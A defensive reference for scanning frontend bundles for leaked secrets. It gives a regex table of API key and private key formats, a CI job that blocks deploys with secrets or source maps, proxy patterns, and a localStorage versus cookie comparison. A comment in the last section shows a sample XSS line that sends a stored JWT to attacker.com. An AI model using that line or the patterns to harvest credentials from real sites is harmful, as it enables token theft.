# Frontend Secret Scanner — Technical Reference

## 1. Service-Specific Secret Patterns (Extended Regex Table)

Use these patterns when scanning bundle files with `grep -rE`:

| Service | Pattern | Notes |
|---|---|---|
| Google API | `AIza[0-9A-Za-z_-]{35}` | Generic Google API key |
| Google OAuth | `[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com` | OAuth client ID |
| AWS Access Key | `AKIA[0-9A-Z]{16}` | Always 20 chars |
| AWS Secret Key | `[A-Za-z0-9/+=]{40}` (near "aws_secret") | Context-dependent |
| OpenAI | `sk-[a-zA-Z0-9]{48}` | API key |
| GitHub PAT (classic) | `ghp_[A-Za-z0-9_]{36}` | Personal access token |
| GitHub PAT (fine-grained) | `github_pat_[A-Za-z0-9_]{82}` | Fine-grained PAT |
| Stripe Publishable | `pk_(test\|live)_[0-9a-zA-Z]{24,}` | Safe to expose |
| Stripe Secret | `sk_(test\|live)_[0-9a-zA-Z]{24,}` | NEVER expose |
| Slack Token | `xox[baprs]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}` | Bot/user/app token |
| Twilio | `AC[a-z0-9]{32}` | Account SID |
| SendGrid | `SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}` | API key |
| Firebase | `[A-Za-z0-9_-]{8}:[A-Za-z0-9_-]{140}` | Push auth key |
| JWT | `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` | Encoded token |
| RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` | PEM header |
| EC Private Key | `-----BEGIN EC PRIVATE KEY-----` | PEM header |

---

## 2. CI/CD Integration for Bundle Scanning

Add secret scanning to the build pipeline so secrets are caught before deployment:

### GitHub Actions — Pre-deploy Bundle Scan
```yaml
name: Bundle Secret Scan

on:
  push:
    branches: [main, release/*]

jobs:
  scan-bundle:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build production bundle
        run: npm ci && npm run build

      - name: Install TruffleHog
        run: pip install trufflehog3

      - name: Scan build output for secrets
        run: |
          trufflehog3 --format json filesystem ./dist ./build > scan-results.json || true
          
          # Fail if high-severity secrets found
          if grep -q '"severity": "HIGH"' scan-results.json; then
            echo "❌ High-severity secrets detected in build output!"
            cat scan-results.json
            exit 1
          fi

      - name: Check for exposed source maps
        run: |
          if find dist/ build/ -name "*.map" | grep -q .; then
            echo "⚠️  WARNING: Source map files found in production build!"
            find dist/ build/ -name "*.map"
            exit 1
          fi
```

---

## 3. Secure Environment Variable Architecture Patterns

### Pattern 1: API Proxy Route (Next.js)
```javascript
// pages/api/data.js — Server-side API route
// The PRIVATE_API_KEY never leaves the server
export default async function handler(req, res) {
    const response = await fetch('https://private-service.com/data', {
        headers: {
            'Authorization': `Bearer ${process.env.PRIVATE_API_KEY}`
        }
    });
    const data = await response.json();
    res.json(data); // Only safe fields forwarded to client
}

// Client component calls /api/data (no key needed client-side)
const data = await fetch('/api/data').then(r => r.json());
```

### Pattern 2: Backend-for-Frontend (BFF)
```
Browser → BFF Server (Node.js/Go/Python) → External API
                ↑ Private keys live here only, never sent to browser
```

### Pattern 3: Runtime Config Injection (Non-Build-Time)
```html
<!-- index.html: inject only non-secret public config at runtime -->
<script>
  window.__APP_CONFIG__ = {
    apiBaseUrl: 'https://api.example.com',
    analyticsId: 'GA4-XXXXXXXX',
    // NEVER: apiKey, secretKey, token, password
  };
</script>
```

---

## 4. localStorage vs Cookie Security Comparison

```javascript
// VULNERABLE: Storing JWT in localStorage
function login(credentials) {
    const token = await api.authenticate(credentials);
    localStorage.setItem('jwt', token); // Any script can read this!
}

// Every XSS payload can steal the token:
// fetch('https://attacker.com/?t=' + localStorage.getItem('jwt'))

// SAFE: Let the server set an HttpOnly cookie
// Server response: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
// Browser automatically includes this cookie in subsequent requests
// JavaScript cannot read it at all
```

**When localStorage IS acceptable:**
- Non-sensitive user preferences (theme, language, last-visited page)
- Caching public, non-personalized API responses
- Draft/state that can be freely recreated without security impact
